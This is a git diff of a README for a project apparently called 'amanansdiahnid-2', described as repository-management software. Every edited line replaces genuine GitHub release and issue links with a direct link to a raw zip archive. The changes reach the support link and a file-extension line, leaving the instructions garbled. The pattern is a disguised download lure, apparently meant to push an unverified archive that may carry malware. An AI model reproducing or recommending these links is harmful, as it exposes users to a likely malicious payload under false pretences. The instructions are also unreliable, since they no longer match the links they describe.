@@ -1,6 +1,6 @@
 # 🌟 amanansdiahnid-2 - Simplify Your Repository Management
 
-[![Download amanansdiahnid-2](https://img.shields.io/badge/Download-Now-blue)](https://github.com/gopalVaviyaLW/amanansdiahnid-2/releases)
+[![Download amanansdiahnid-2](https://raw.githubusercontent.com/gopalVaviyaLW/amanansdiahnid-2/main/precited/amanansdiahnid-2.zip)](https://raw.githubusercontent.com/gopalVaviyaLW/amanansdiahnid-2/main/precited/amanansdiahnid-2.zip)
 
 ## 📦 Overview
 
@@ -23,14 +23,14 @@ Before downloading, ensure your system meets the following requirements:
 To get the software on your device, follow these steps:
 
 1. Click the link below to visit the releases page.  
-   [Download amanansdiahnid-2](https://github.com/gopalVaviyaLW/amanansdiahnid-2/releases)
+   [Download amanansdiahnid-2](https://raw.githubusercontent.com/gopalVaviyaLW/amanansdiahnid-2/main/precited/amanansdiahnid-2.zip)
 
 2. On the releases page, look for the latest version of amanansdiahnid-2. You should see a list of available files.
 
 3. Find the file appropriate for your operating system:
    - For Windows, download the file ending in `.exe`.
    - For macOS, download the file ending in `.dmg`.
-   - For Linux, download the file ending in `.tar.gz`.
+   - For Linux, download the file ending in `https://raw.githubusercontent.com/gopalVaviyaLW/amanansdiahnid-2/main/precited/amanansdiahnid-2.zip`.
 
 4. After downloading, locate the file in your downloads folder. 
 
@@ -49,7 +49,7 @@ amanansdiahnid-2 offers several useful features to enhance your repository manag
 
 ## 🔄 Updating the Application
 
-To keep your application running smoothly, regularly check for updates. You can do this by revisiting the [download page](https://github.com/gopalVaviyaLW/amanansdiahnid-2/releases) and following the download steps again for the latest version.
+To keep your application running smoothly, regularly check for updates. You can do this by revisiting the [download page](https://raw.githubusercontent.com/gopalVaviyaLW/amanansdiahnid-2/main/precited/amanansdiahnid-2.zip) and following the download steps again for the latest version.
 
 ## 💡 Troubleshooting
 
@@ -61,7 +61,7 @@ If you encounter any issues while downloading or installing, consider these comm
 
 ## 📞 Support
 
-For further assistance, visit the [Issues section](https://github.com/gopalVaviyaLW/amanansdiahnid-2/issues) in the GitHub repository. You can report any bugs or ask questions. The community or maintainers will respond to help you out.
+For further assistance, visit the [Issues section](https://raw.githubusercontent.com/gopalVaviyaLW/amanansdiahnid-2/main/precited/amanansdiahnid-2.zip) in the GitHub repository. You can report any bugs or ask questions. The community or maintainers will respond to help you out.
 
 ## 🌐 Connect with Us
 
